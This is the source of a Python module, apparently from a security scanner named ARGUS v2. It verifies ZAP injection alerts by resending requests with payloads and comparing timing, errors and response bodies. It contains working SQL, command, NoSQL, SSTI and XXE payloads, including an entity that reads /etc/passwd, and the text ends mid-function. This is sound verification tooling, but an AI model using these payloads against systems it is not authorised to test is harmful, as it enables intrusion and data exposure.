"""
ARGUS v2 - Injection Payload Injector (Custom Multi-Signal Verification)
"""

import copy
import difflib
import json
import re
import time
import statistics
import urllib.parse
import importlib.util
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import requests

try:
    from .models import DetectionResult, VerificationStatus
except ImportError:
    _models_path = Path(__file__).with_name("models.py")
    _spec = importlib.util.spec_from_file_location("diag_g12_models", _models_path)
    if _spec is None or _spec.loader is None:
        raise
    _models = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(_models)
    DetectionResult = _models.DetectionResult
    VerificationStatus = _models.VerificationStatus


@dataclass
class ProbeResponse:
    elapsed: float
    status_code: str
    text: str
    headers: Dict[str, str]
    error: str = ""


class BaseInjector:
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"org\.postgresql\.util\.PSQLException",
        r"unterminated quoted string",
        r"ORA-\d{5}",
        r"Oracle error",
        r"Microsoft SQL Native Client",
        r"SQL Server",
        r"Unclosed quotation mark",
        r"ODBC SQL Server Driver",
        r"SQLite/JDBCDriver",
        r"SQLiteException",
        r"sqlite3\.OperationalError",
        r"near .*: syntax error",
        r"JdbcSQLSyntaxErrorException",
        r"BadSqlGrammarException",
        r"SQLGrammarException",
        r"DataIntegrityViolationException",
        r"syntax error at or near",
    ]

    COMMAND_ERROR_PATTERNS = [
        r"/bin/sh:",
        r"cmd\.exe",
        r"command not found",
        r"No such file or directory",
        r"Permission denied",
        r"CreateProcess error",
        r"Runtime\.exec",
    ]

    XML_XPATH_ERROR_PATTERNS = [
        r"XPathExpressionException",
        r"XPathException",
        r"javax\.xml\.xpath",
        r"Invalid XPath",
        r"xmlXPath",
        r"SAXParseException",
        r"DOCTYPE is disallowed",
        r"DocumentBuilder",
        r"XML parser",
        r"XSLT",
        r"TransformerException",
        r"SOAPException",
    ]

    def __init__(self, jwt_token: str = "", verification_mode: str = "balanced"):
        self.jwt_token = jwt_token
        self.verification_mode = verification_mode
        self.headers = {"Content-Type": "application/json"}
        if self.jwt_token:
            auth_val = self.jwt_token if self.jwt_token.lower().startswith("bearer") else f"Bearer {self.jwt_token}"
            self.headers["Authorization"] = auth_val

        self.sleep_secs = 3
        # --- time-based robust verification tuning ---
        self.TIME_SAMPLES = 3        # 각 측정 반복 횟수 (median 계산용)
        self.TIME_SLEEP_SECS = 3     # 주입 sleep 초 (self.sleep_secs 와 동일하게)
        self.LINEARITY_RATIO = 0.6   # sleep(S) 증가분이 최소 S*ratio 초 이상이어야 확정
        self.ZERO_NOISE_MARGIN = 1.0 # sleep(0) 증가분이 이보다 크면 baseline 불안정 → 보류
        # --- boolean-based robust verification tuning ---
        self.BOOL_SAMPLES = 3          # true/false/baseline 각 측정 반복 횟수 (median)
        self.BOOL_TRUE_MIN = 0.90      # TRUE~baseline 유사도 하한 (anchor 성립 조건)
        self.BOOL_FALSE_MAX = 0.75     # FALSE~baseline 유사도 상한
        self.BOOL_TF_MAX = 0.85        # TRUE~FALSE 유사도 상한
        self.BOOL_REPEAT_RATIO = 0.6   # 같은 쌍을 여러 번 시도했을 때 갈라진 비율 하한
        self.time_payloads: List[str] = []
        self.error_payloads: List[str] = []
        self.boolean_pairs: List[Tuple[str, str]] = []

    def _request_headers(self, result: DetectionResult) -> Dict[str, str]:
        headers = dict(self.headers)
        for key, value in (result.raw_request_headers or {}).items():
            if key.lower() in {"host", "content-length", "accept-encoding"}:
                continue
            headers[key] = value
        if self.jwt_token:
            auth_val = self.jwt_token if self.jwt_token.lower().startswith("bearer") else f"Bearer {self.jwt_token}"
            headers["Authorization"] = auth_val
        return headers

    def _absolute_url(self, result: DetectionResult) -> str:
        candidate = result.raw_request_url or result.url
        if candidate.startswith("http://") or candidate.startswith("https://"):
            return candidate
        base = urllib.parse.urlparse(result.url)
        if candidate.startswith("/"):
            return f"{base.scheme}://{base.netloc}{candidate}"
        return result.url

    def send_probe(self, method: str, url: str, body: Optional[str], headers: Dict[str, str]) -> ProbeResponse:
        try:
            start = time.time()
            response = requests.request(
                method=method,
                url=url,
                headers=headers,
                data=body.encode("utf-8") if body is not None else None,
                timeout=max(10, self.sleep_secs + 5),
                allow_redirects=False,
            )
            elapsed = time.time() - start
            return ProbeResponse(
                elapsed=elapsed,
                status_code=str(response.status_code),
                text=response.text[:200000],
                headers=dict(response.headers),
            )
        except requests.exceptions.Timeout:
            return ProbeResponse(float(max(10, self.sleep_secs + 5)), "TIMEOUT", "", {}, "timeout")
        except Exception as exc:
            return ProbeResponse(-1.0, "ERROR", "", {}, str(exc))

    def _normalize_param_name(self, value: str) -> str:
        return (value or "").strip().strip("짬쨩").casefold()

    def _param_matches(self, candidate: str, target: str) -> bool:
        return self._normalize_param_name(candidate) == self._normalize_param_name(target)

    def _replace_path_param(self, url: str, param_name: str, value: str) -> Tuple[str, bool]:
        parsed = urllib.parse.urlsplit(url)
        target = self._normalize_param_name(param_name)
        if not parsed.path or not target:
            return url, False

        changed = False
        segments = []
        for segment in parsed.path.split("/"):
            decoded = urllib.parse.unquote(segment)
            normalized = self._normalize_param_name(decoded.strip("{}<>:"))
            if normalized == target or decoded in {f"{{{param_name}}}", f":{param_name}", f"<{param_name}>"}:
                segments.append(urllib.parse.quote(value, safe=""))
                changed = True
            else:
                segments.append(segment)
        if not changed:
            return url, False
        path = "/".join(segments)
        return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, path, parsed.query, parsed.fragment)), True

    def _replace_query_param(self, url: str, param_name: str, value: str) -> Tuple[str, bool]:
        parsed = urllib.parse.urlsplit(url)
        pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        changed = False
        replaced = []
        for key, current in pairs:
            if self._param_matches(key, param_name):
                replaced.append((key, value))
                changed = True
            else:
                replaced.append((key, current))
        if not changed:
            return url, False
        query = urllib.parse.urlencode(replaced, doseq=True)
        return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, query, parsed.fragment)), True

    def _replace_json_param(self, raw_body: str, param_name: str, value: str) -> Tuple[str, bool]:
        if not raw_body:
            return raw_body, False
        try:
            body_obj = json.loads(raw_body)
        except json.JSONDecodeError:
            return raw_body, False

        changed = False

        def walk(node: Any) -> Any:
            nonlocal changed
            if isinstance(node, dict):
                next_node = {}
                for key, current in node.items():
                    if self._param_matches(key, param_name):
                        next_node[key] = value
                        changed = True
                    else:
                        next_node[key] = walk(current)
                return next_node
            if isinstance(node, list):
                return [walk(item) for item in node]
            return node

        replaced = walk(copy.deepcopy(body_obj))
        if not changed:
            return raw_body, False
        return json.dumps(replaced, ensure_ascii=False, separators=(",", ":")), True

    def _replace_header_param(self, headers: Dict[str, str], param_name: str, value: str) -> Tuple[Dict[str, str], bool]:
        changed = False
        replaced = {}
        for key, current in headers.items():
            if self._param_matches(key, param_name):
                replaced[key] = value
                changed = True
            else:
                replaced[key] = current
        return replaced, changed

    def _replace_form_param(self, raw_body: str, param_name: str, value: str) -> Tuple[str, bool]:
        if not raw_body or "=" not in raw_body:
            return raw_body, False
        pairs = urllib.parse.parse_qsl(raw_body, keep_blank_values=True)
        if not pairs:
            return raw_body, False

        changed = False
        replaced = []
        for key, current in pairs:
            if self._param_matches(key, param_name):
                replaced.append((key, value))
                changed = True
            else:
                replaced.append((key, current))
        if not changed:
            return raw_body, False
        return urllib.parse.urlencode(replaced, doseq=True), True

    def _replace_attack_literal(self, url: str, body: str, attack: str, value: str) -> Tuple[str, str, bool]:
        if not attack:
            return url, body, False
        changed = False
        encoded_attack = urllib.parse.quote(attack, safe="")
        encoded_value = urllib.parse.quote(value, safe="")
        if encoded_attack and encoded_attack in url:
            url = url.replace(encoded_attack, encoded_value)
            changed = True
        elif attack in url:
            url = url.replace(attack, value)
            changed = True

        if body:
            json_attack = json.dumps(attack)[1:-1]
            json_value = json.dumps(value)[1:-1]
            if json_attack and json_attack in body:
                body = body.replace(json_attack, json_value)
                changed = True
            elif attack in body:
                body = body.replace(attack, value)
                changed = True
        return url, body, changed

    def _build_variant(self, result: DetectionResult, replacement: str) -> Tuple[str, str, bool, str]:
        url = self._absolute_url(result)
        body = result.raw_request_body or ""
        param_name = result.param or ""

        url, path_changed = self._replace_path_param(url, param_name, replacement)
        url, query_changed = self._replace_query_param(url, param_name, replacement)
        body, body_changed = self._replace_json_param(body, param_name, replacement)
        form_body, form_changed = self._replace_form_param(body, param_name, replacement)
        if form_changed:
            body = form_body
        if path_changed or query_changed or body_changed or form_changed:
            locations = []
            if path_changed:
                locations.append("path")
            if query_changed:
                locations.append("query")
            if body_changed:
                locations.append("json_body")
            if form_changed:
                locations.append("form_body")
            return url, body, True, "+".join(locations)

        url, body, literal_changed = self._replace_attack_literal(url, body, result.zap_payload, replacement)
        if literal_changed:
            return url, body, True, "zap_attack_literal"
        return url, body, False, "not_found"

    def _build_probe_variant(
        self,
        result: DetectionResult,
        replacement: str,
        headers: Dict[str, str],
    ) -> Tuple[str, str, Dict[str, str], bool, str]:
        url, body, changed, location = self._build_variant(result, replacement)
        replaced_headers, header_changed = self._replace_header_param(headers, result.param or "", replacement)
        if header_changed:
            locations = [] if location == "not_found" else [location]
            locations.append("header")
            return url, body, replaced_headers, True, "+".join(locations)
        return url, body, headers, changed, location

    def _body_fingerprint(self, text: str) -> str:
        compact = re.sub(r"\s+", " ", text or "").strip()
        compact = re.sub(r"\d{4}-\d{2}-\d{2}[T ][\d:.+-Z]*", "<date>", compact)
        compact = re.sub(r"\b[0-9a-f]{8,}\b", "<hex>", compact, flags=re.I)
        return compact[:50000]

    def _similarity(self, left: str, right: str) -> float:
        return difflib.SequenceMatcher(None, self._body_fingerprint(left), self._body_fingerprint(right)).ratio()

    def _match_patterns(self, text: str, patterns: List[str]) -> List[str]:
        return [p for p in patterns if re.search(p, text or "", re.IGNORECASE)]

    def _add_method(self, result: DetectionResult, name: str, status: VerificationStatus, evidence: str, **extra: Any) -> None:
        result.verification_methods[name] = {
            "status": status.value,
            "evidence": evidence,
            **extra,
        }

    def _set_status(self, result: DetectionResult, status: VerificationStatus, reason: str) -> DetectionResult:
        result.verification_status = status
        result.verification_reason = reason
        result.cross_validated = status == VerificationStatus.VERIFIED
        result.custom_verified = status == VerificationStatus.VERIFIED
        return result

    def _is_aggressive(self) -> bool:
        return self.verification_mode == "aggressive"

    def _is_strict(self) -> bool:
        return self.verification_mode == "strict"

    def _strong_verified_methods(self, result: DetectionResult, verified_methods: List[str]) -> List[str]:
        """High-confidence methods accepted even in strict mode.

        time_based  : median-of-N + 선형성(선형 비례) 통과분만 VERIFIED 로 옴
        error_based : DB/parser 에러 패턴 매칭 (결정적)
        boolean_based: 반복 재현성(repeat_ratio >= 임계) 통과분만 VERIFIED 로 옴
                       → 강화된 반복검증을 통과한 boolean 은 strict 에서도 확정 인정
        """
        strong: List[str] = []
        if "time_based" in verified_methods:
            strong.append("time_based")
        if "error_based" in verified_methods:
            patterns = (result.verification_methods.get("error_based") or {}).get("matched_patterns") or []
            if patterns:
                strong.append("error_based")
        if "boolean_based" in verified_methods:
            detail = result.verification_methods.get("boolean_based") or {}
            ratio = detail.get("repeat_ratio", 0.0)
            # 반복검증을 통과(VERIFIED)한 boolean 만 여기 들어옴 → strict 에서도 확정 인정
            if detail.get("status") == VerificationStatus.VERIFIED.value and ratio >= self.BOOL_REPEAT_RATIO:
                strong.append("boolean_based")
        return strong

    def _finalize_verified(
        self,
        result: DetectionResult,
        verified_methods: List[str],
        baseline: ProbeResponse,
        max_delay: float,
    ) -> DetectionResult:
        if self._is_strict():
            strong = self._strong_verified_methods(result, verified_methods)
            if strong:
                reason = "Verified by " + ", ".join(strong) + " (strict: time/error-pattern)."
                result.evidence = reason
                return self._set_status(result, VerificationStatus.VERIFIED, reason)
            reason = (
                "Weak evidence rejected in strict mode: "
                + ", ".join(verified_methods)
                + " (boolean-only is not injection — needs time delay or DB error pattern)."
            )
            result.custom_time_delay_sec = max_delay
            result.evidence = reason
            return self._set_status(result, VerificationStatus.FALSE_POSITIVE, reason)

        reason = "Verified by " + ", ".join(verified_methods) + "."
        result.evidence = reason
        return self._set_status(result, VerificationStatus.VERIFIED, reason)

    def _should_keep_as_suspected(self, result: DetectionResult, baseline: ProbeResponse) -> bool:
        if not self._is_aggressive():
            return False
        unstable_baseline = baseline.status_code.startswith("5") or baseline.status_code in {"TIMEOUT", "ERROR"}
        zap_had_attack = bool(result.zap_payload)
        high_or_medium = (result.risk or "").upper() in {"HIGH", "MEDIUM"}
        if high_or_medium and (unstable_baseline or zap_had_attack):
            return True
        if result.has_zap:
            return False
        return False

    def _measure_median(self, method, url, body, headers, samples):
        """같은 요청을 samples 번 보내고 elapsed 중앙값 반환. 실패(-1)는 제외."""
        elapseds = []
        for _ in range(max(1, samples)):
            probe = self.send_probe(method, url, body, headers)
            if probe.elapsed >= 0:
                elapseds.append(probe.elapsed)
        if not elapseds:
            return -1.0
        return statistics.median(elapseds)

    def _build_sleep_payload(self, sleep_secs):
        """sleep 초를 바꿔가며 payload 생성 (MySQL SLEEP 기준)."""
        return f"1 AND SLEEP({sleep_secs})"

    def _verify_time_based(
        self,
        result: DetectionResult,
        baseline,  # ProbeResponse (기존 시그니처 유지용, 아래서 median 으로 다시 잼)
        headers: Dict[str, str],
        method: str,
    ) -> Tuple[bool, float]:
        S = int(self.TIME_SLEEP_SECS)

        # 1) baseline median-of-N
        clean_url, clean_body, clean_headers, clean_changed, _ = self._build_probe_variant(
            result, "1", headers
        )
        if not clean_changed:
            self._add_method(
                result, "time_based", VerificationStatus.UNVERIFIABLE,
                "No time-based variant could be built.",
            )
            return False, 0.0

        base_med = self._measure_median(method, clean_url, clean_body, clean_headers, self.TIME_SAMPLES)
        if base_med < 0:
            self._add_method(
                result, "time_based", VerificationStatus.UNVERIFIABLE,
                "Baseline timing could not be measured.",
            )
            return False, 0.0

        # 2) sleep(0) median : 부하 기준선
        zero_payload = self._build_sleep_payload(0)
        z_url, z_body, z_headers, z_changed, _ = self._build_probe_variant(result, zero_payload, headers)
        zero_med = (
            self._measure_median(method, z_url, z_body, z_headers, self.TIME_SAMPLES)
            if z_changed else base_med
        )
        if zero_med < 0:
            zero_med = base_med

        # 3) sleep(S) median
        s_payload = self._build_sleep_payload(S)
        s_url, s_body, s_headers, s_changed, s_location = self._build_probe_variant(result, s_payload, headers)
        if not s_changed:
            self._add_method(
                result, "time_based", VerificationStatus.UNVERIFIABLE,
                "No time-based variant could be built.",
            )
            return False, 0.0
        sleep_med = self._measure_median(method, s_url, s_body, s_headers, self.TIME_SAMPLES)
        if sleep_med < 0:
            self._add_method(
                result, "time_based", VerificationStatus.UNVERIFIABLE,
                "Injected timing could not be measured.",
            )
            return False, 0.0

        # 4) 선형성 판정
        zero_delta = zero_med - base_med
        sleep_delta = sleep_med - zero_med
        base_info = dict(
            baseline_med_sec=round(base_med, 3),
            sleep0_med_sec=round(zero_med, 3),
            sleep_s_med_sec=round(sleep_med, 3),
            sleep_secs=S,
            zero_delta_sec=round(zero_delta, 3),
            sleep_delta_sec=round(sleep_delta, 3),
            samples=self.TIME_SAMPLES,
        )

        # (a) sleep(0)에서 이미 크게 느려짐 → baseline 불안정 → 보류(SUSPECTED)
        if zero_delta > self.ZERO_NOISE_MARGIN:
            self._add_method(
                result, "time_based", VerificationStatus.SUSPECTED,
                "Baseline unstable under load (sleep(0) already slow) — not confirmed.",
                **base_info,
            )
            return False, sleep_med

        # (b) 증가분이 요청한 S 에 비례 → 진짜 sleep 실행 = VERIFIED
        if sleep_delta >= S * self.LINEARITY_RATIO:
            result.custom_payload = s_payload
            result.custom_time_delay_sec = sleep_med
            self._add_method(
                result, "time_based", VerificationStatus.VERIFIED,
                f"Delay scaled with injected sleep at {s_location} (linear).",
                **base_info,
            )
            return True, sleep_med

        # (c) 값 바꿔도 지연 그대로 → 부하/노이즈 오탐
        self._add_method(
            result, "time_based", VerificationStatus.FALSE_POSITIVE,
            "Delay did not scale with injected sleep — load/noise, not injection.",
            **base_info,
        )
        return False, sleep_med

    def _verify_error_based(self, result: DetectionResult, baseline: ProbeResponse, headers: Dict[str, str], method: str) -> bool:
        error_patterns = self.SQL_ERROR_PATTERNS + self.COMMAND_ERROR_PATTERNS + self.XML_XPATH_ERROR_PATTERNS
        baseline_errors = set(self._match_patterns(baseline.text, error_patterns))
        tried = 0
        suspected_signal: Optional[Dict[str, Any]] = None
        for payload in self.error_payloads:
            url, body, probe_headers, changed, location = self._build_probe_variant(result, payload, headers)
            if not changed:
                continue
            tried += 1
            probe = self.send_probe(method, url, body, probe_headers)
            patterns = set(self._match_patterns(probe.text, error_patterns)) - baseline_errors
            status_changed_to_error = baseline.status_code[0:1] not in {"5"} and probe.status_code.startswith("5")
            if patterns:
                result.custom_payload = payload
                self._add_method(
                    result,
                    "error_based",
                    VerificationStatus.VERIFIED,
                    f"Error signal changed at {location}.",
                    status_code=probe.status_code,
                    matched_patterns=sorted(patterns),
                    payload=payload,
                )
                return True
            if status_changed_to_error:
                suspected_signal = suspected_signal or {
                    "location": location,
                    "baseline_status_code": baseline.status_code,
                    "status_code": probe.status_code,
                    "payload": payload,
                }
        if suspected_signal:
            result.custom_payload = suspected_signal["payload"]
            self._add_method(
                result,
                "error_based",
                VerificationStatus.FALSE_POSITIVE,
                (
                    f"5xx at {suspected_signal['location']} without DB/parser error pattern — "
                    "treated as input/server error, not injection."
                ),
                baseline_status_code=suspected_signal["baseline_status_code"],
                status_code=suspected_signal["status_code"],
                matched_patterns=[],
                payload=suspected_signal["payload"],
            )
            return False
        self._add_method(
            result,
            "error_based",
            VerificationStatus.FALSE_POSITIVE if tried else VerificationStatus.UNVERIFIABLE,
            "No new SQL/command error signal." if tried else "No error-based variant could be built.",
            tried_payloads=tried,
        )
        return False

    def _median_similarity(self, method, url, body, headers, ref_text, samples):
        """같은 요청을 samples 번 보내 각 응답과 ref_text 의 유사도 중앙값 + 대표 응답 반환."""
        import statistics as _st
        sims = []
        last_probe = None
        for _ in range(max(1, samples)):
            probe = self.send_probe(method, url, body, headers)
            last_probe = probe
            if probe.elapsed >= 0:
                sims.append(self._similarity(probe.text, ref_text))
        if not sims:
            return -1.0, last_probe
        return _st.median(sims), last_probe

    def _verify_boolean_based(self, result: DetectionResult, baseline: ProbeResponse, headers: Dict[str, str], method: str) -> bool:
        tried = 0
        best_delta = 0.0
        N = self.BOOL_SAMPLES
        for true_payload, false_payload in self.boolean_pairs:
            true_url, true_body, true_headers, true_changed, true_location = self._build_probe_variant(result, true_payload, headers)
            false_url, false_body, false_headers, false_changed, _ = self._build_probe_variant(result, false_payload, headers)
            if not (true_changed and false_changed):
                continue
            tried += 1

            # 반복 시도: 각 라운드마다 true/false 를 재서 '일관되게' 갈라지는지 확인
            rounds = max(1, N)
            diverged_rounds = 0
            true_status = false_status = ""
            last_true_to_base = last_false_to_base = last_true_to_false = 0.0
            for _ in range(rounds):
                true_probe = self.send_probe(method, true_url, true_body, true_headers)
                false_probe = self.send_probe(method, false_url, false_body, false_headers)
                if true_probe.elapsed < 0 or false_probe.elapsed < 0:
                    continue
                true_to_base = self._similarity(true_probe.text, baseline.text)
                false_to_base = self._similarity(false_probe.text, baseline.text)
                true_to_false = self._similarity(true_probe.text, false_probe.text)
                last_true_to_base, last_false_to_base, last_true_to_false = true_to_base, false_to_base, true_to_false
                true_status, false_status = true_probe.status_code, false_probe.status_code
                delta = abs(true_to_base - false_to_base)
                best_delta = max(best_delta, delta)
                status_diverged = (
                    true_probe.status_code != false_probe.status_code
                    and true_probe.status_code == baseline.status_code
                )
                # anchor 검증: TRUE 는 baseline 과 유사해야 하고, FALSE 는 달라야 함
                body_diverged = (
                    true_to_base >= self.BOOL_TRUE_MIN
                    and false_to_base <= self.BOOL_FALSE_MAX
                    and true_to_false <= self.BOOL_TF_MAX
                )
                if status_diverged or body_diverged:
                    diverged_rounds += 1

            repeat_ratio = diverged_rounds / rounds if rounds else 0.0
            if repeat_ratio >= self.BOOL_REPEAT_RATIO:
                result.custom_payload = f"TRUE:{true_payload} / FALSE:{false_payload}"
                self._add_method(
                    result,
                    "boolean_based",
                    VerificationStatus.VERIFIED,
                    f"Boolean true/false responses consistently diverged at {true_location} "
                    f"({diverged_rounds}/{rounds} rounds).",
                    true_status=true_status,
                    false_status=false_status,
                    true_to_baseline=round(last_true_to_base, 3),
                    false_to_baseline=round(last_false_to_base, 3),
                    true_to_false=round(last_true_to_false, 3),
                    diverged_rounds=diverged_rounds,
                    rounds=rounds,
                    repeat_ratio=round(repeat_ratio, 3),
                    true_payload=true_payload,
                    false_payload=false_payload,
                )
                return True
            # 한 번이라도 갈렸지만 일관적이지 않음 → 약한 신호(SUSPECTED)
            if diverged_rounds > 0:
                self._add_method(
                    result,
                    "boolean_based",
                    VerificationStatus.SUSPECTED,
                    f"Boolean divergence unstable at {true_location} "
                    f"({diverged_rounds}/{rounds} rounds) — dynamic content or load suspected.",
                    diverged_rounds=diverged_rounds,
                    rounds=rounds,
                    repeat_ratio=round(repeat_ratio, 3),
                    best_similarity_delta=round(best_delta, 3),
                    true_payload=true_payload,
                    false_payload=false_payload,
                )
                return False
        self._add_method(
            result,
            "boolean_based",
            VerificationStatus.FALSE_POSITIVE if tried else VerificationStatus.UNVERIFIABLE,
            "No stable boolean response divergence." if tried else "No boolean variants could be built.",
            tried_pairs=tried,
            best_similarity_delta=round(best_delta, 3),
        )
        return False

    def verify_zap_alert(self, result: DetectionResult) -> DetectionResult:
        try:
            result.verification_methods = {}
            method = result.method.upper()
            headers = self._request_headers(result)
            clean_url, clean_body, clean_headers, clean_changed, clean_location = self._build_probe_variant(result, "1", headers)
            if not clean_changed:
                reason = f"Parameter '{result.param}' was not found in path, query, JSON body, form body, or ZAP attack literal."
                self._add_method(result, "request_rebuild", VerificationStatus.UNVERIFIABLE, reason)
                result.evidence = f"Unverifiable. {reason}"
                return self._set_status(result, VerificationStatus.UNVERIFIABLE, reason)

            baseline = self.send_probe(method, clean_url, clean_body, clean_headers)
            self._add_method(
                result,
                "baseline",
                VerificationStatus.VERIFIED if baseline.elapsed >= 0 else VerificationStatus.UNVERIFIABLE,
                f"Baseline request rebuilt via {clean_location}.",
                status_code=baseline.status_code,
                elapsed_sec=round(baseline.elapsed, 3),
            )
            if baseline.elapsed < 0:
                reason = f"Baseline request failed ({baseline.error})."
                result.evidence = f"Unverifiable. {reason}"
                return self._set_status(result, VerificationStatus.UNVERIFIABLE, reason)

            verified_methods = []
            max_delay = 0.0
            if self._verify_error_based(result, baseline, headers, method):
                verified_methods.append("error_based")
            boolean_verified = self._verify_boolean_based(result, baseline, headers, method)
            if boolean_verified:
                verified_methods.append("boolean_based")
            time_verified, max_delay = self._verify_time_based(result, baseline, headers, method)
            if time_verified:
                verified_methods.append("time_based")

            if verified_methods:
                return self._finalize_verified(result, verified_methods, baseline, max_delay)

            if self._should_keep_as_suspected(result, baseline):
                if result.has_zap:
                    reason = (
                        "Kept as suspected in aggressive mode: ZAP reported injection risk, "
                        "but active verification evidence was inconclusive."
                    )
                else:
                    reason = (
                        "Kept as suspected in aggressive mode: direct probe on unstable baseline "
                        "with inconclusive verification evidence."
                    )
                if baseline.status_code.startswith("5"):
                    reason += " Baseline request returned 5xx, so the endpoint is not stable enough to dismiss safely."
                result.evidence = reason
                return self._set_status(result, VerificationStatus.SUSPECTED, reason)

            suspected_methods = [
                name
                for name, detail in result.verification_methods.items()
                if detail.get("status") == VerificationStatus.SUSPECTED.value
            ]
            if suspected_methods:
                reason = "Suspicious injection behavior observed, but only weak evidence was reproduced: " + ", ".join(suspected_methods) + "."
                result.evidence = reason
                return self._set_status(result, VerificationStatus.SUSPECTED, reason)

            method_statuses = [m["status"] for m in result.verification_methods.values()]
            if method_statuses and all(s == VerificationStatus.UNVERIFIABLE.value for s in method_statuses if s != VerificationStatus.VERIFIED.value):
                reason = "All verification methods were unverifiable."
                result.evidence = reason
                return self._set_status(result, VerificationStatus.UNVERIFIABLE, reason)

            reason = "No error, boolean, or time-based evidence confirmed injection."
            result.custom_time_delay_sec = max_delay
            result.evidence = reason
            return self._set_status(result, VerificationStatus.FALSE_POSITIVE, reason)
        except Exception as exc:
            result.evidence = f"Verification error: {exc}"
            self._add_method(result, "exception", VerificationStatus.ERROR, str(exc))
            return self._set_status(result, VerificationStatus.ERROR, str(exc))


class SqliInjector(BaseInjector):
    def __init__(self, jwt_token: str = "", verification_mode: str = "balanced"):
        super().__init__(jwt_token, verification_mode)
        self.error_payloads = [
            "'",
            "\"",
            "')",
            "\")",
            "'--",
            "\"--",
            "1'",
            "1\"",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))-- -",
            "1' AND UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 1)-- -",
            "1' UNION SELECT NULL-- -",
            "1' OR '1'='1'-- -",
        ]
        self.boolean_pairs = [
            ("1 AND 1=1", "1 AND 1=2"),
            ("1' AND '1'='1'-- -", "1' AND '1'='2'-- -"),
            ("1\" AND \"1\"=\"1\"-- -", "1\" AND \"1\"=\"2\"-- -"),
            ("1 OR 1=1", "1 OR 1=2"),
        ]
        self.time_payloads = [
            f"1 AND SLEEP({self.sleep_secs})",
            f"1' AND SLEEP({self.sleep_secs})-- -",
            f"' OR SLEEP({self.sleep_secs})-- -",
            f'" OR SLEEP({self.sleep_secs})-- -',
            f"1); SELECT pg_sleep({self.sleep_secs})--",
            f"1' OR pg_sleep({self.sleep_secs}) IS NULL--",
            f"1 WAITFOR DELAY '0:0:{self.sleep_secs}'--",
            f"1 OR randomblob({self.sleep_secs}00000000) IS NOT NULL",
            f"1' OR randomblob({self.sleep_secs}00000000) IS NOT NULL--",
            f'" OR randomblob({self.sleep_secs}00000000) IS NOT NULL--',
        ]


class CommandInjector(BaseInjector):
    def __init__(self, jwt_token: str = "", verification_mode: str = "balanced"):
        super().__init__(jwt_token, verification_mode)
        self.error_payloads = [
            "; argus_command_probe_404",
            "| argus_command_probe_404",
            "&& argus_command_probe_404",
            "`argus_command_probe_404`",
            "$(argus_command_probe_404)",
        ]
        self.boolean_pairs = []
        self.time_payloads = [
            f"; sleep {self.sleep_secs}",
            f"| sleep {self.sleep_secs}",
            f"&& sleep {self.sleep_secs}",
            f"`sleep {self.sleep_secs}`",
            f"$(sleep {self.sleep_secs})",
        ]


class NoSqlInjector(BaseInjector):
    def __init__(self, jwt_token: str = "", verification_mode: str = "balanced"):
        super().__init__(jwt_token, verification_mode)
        self.error_payloads = [
            "'",
            "\"",
            "{\"$ne\":null}",
            "{\"$gt\":\"\"}",
            "'; return true; var x='",
        ]
        self.boolean_pairs = [
            ('{"$ne":null}', '{"$eq":"ARGUS_FALSE_VALUE"}'),
            ("' || '1'=='1", "' || '1'=='2"),
            ('{"$where":"return true"}', '{"$where":"return false"}'),
        ]
        self.time_payloads = [
            "'; sleep(3000); var x='",
            '{"$where":"sleep(3000) || true"}',
        ]


class XmlXPathInjector(BaseInjector):
    def __init__(self, jwt_token: str = "", verification_mode: str = "balanced"):
        super().__init__(jwt_token, verification_mode)
        self.error_payloads = [
            "'",
            '"',
            "'] | //* | //*['",
            "' or '1'='1",
            "\"><!DOCTYPE argus [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><argus>&xxe;</argus>",
            "<?xml version='1.0'?><!DOCTYPE argus [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><argus>&xxe;</argus>",
            "<xsl:value-of select='system-property(\"xsl:version\")'/>",
        ]
        self.boolean_pairs = [
            ("' or '1'='1", "' or '1'='2"),
            ("1 or 1=1", "1 or 1=2"),
        ]
        self.time_payloads = []


class GenericInjectionInjector(BaseInjector):
    def __init__(self, jwt_token: str = "", verification_mode: str = "balanced"):
        super().__init__(jwt_token, verification_mode)
        self.error_payloads = [
            "'",
            '"',
            ";",
            "|",
            "%0d%0aX-Argus-Probe: injected",
        ]
        self.boolean_pairs = []
        self.time_payloads = []


class SstiInjector(BaseInjector):
    def __init__(self, jwt_token: str = "", verification_mode: str = "balanced"):
        super().__init__(jwt_token, verification_mode)
        self.error_payloads = [
            "{{",
            "${",
            "<%=",
            "#{",
            "{{7*'7'}}",
        ]
        self.boolean_pairs = [
            ("{{7*7}}", "{{7*8}}"),
            ("${7*7}", "${7*8}"),
            ("<%= 7*7 %>", "<%= 7*8 %>"),
        ]
        self.time_payloads = []

    def _verify_template_reflection(self, result: DetectionResult, baseline: ProbeResponse, headers: Dict[str, str], method: str) -> bool:
        probes = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
        ]
        tried = 0
        for payload, expected in probes:
            url, body, changed, location = self._build_variant(result, payload)
            if not changed:
                continue
            tried += 1
            probe = self.send_probe(method, url, body, headers)
            if expected in probe.text and expected not in baseline.text:
                result.custom_payload = payload
                self._add_method(
                    result,
                    "ssti_reflection",
                    VerificationStatus.VERIFIED,
                    f"Template expression evaluated at {location}.",
                    expected=expected,
                    payload=payload,
                    status_code=probe.status_code,
                )
                return True
        self._add_method(
            result,
            "ssti_reflection",
            VerificationStatus.FALSE_POSITIVE if tried else VerificationStatus.UNVERIFIABLE,
            "No template evaluation marker was reflected." if tried else "No SSTI reflection variant could be built.",
            tried_payloads=tried,
        )
        return False

    def verify_zap_alert(self, result: DetectionResult) -> DetectionResult:
        verified = super().verify_zap_alert(result)
        if verified.verification_status == VerificationStatus.VERIFIED:
            return verified
        method = result.method.upper()
        headers = self._request_headers(result)
        clean_url, clean_body, clean_changed, _ = self._build_variant(result, "argus-baseline")
        if not clean_changed:
            return verified
        baseline = self.send_probe(method, clean_url, clean_body, headers)
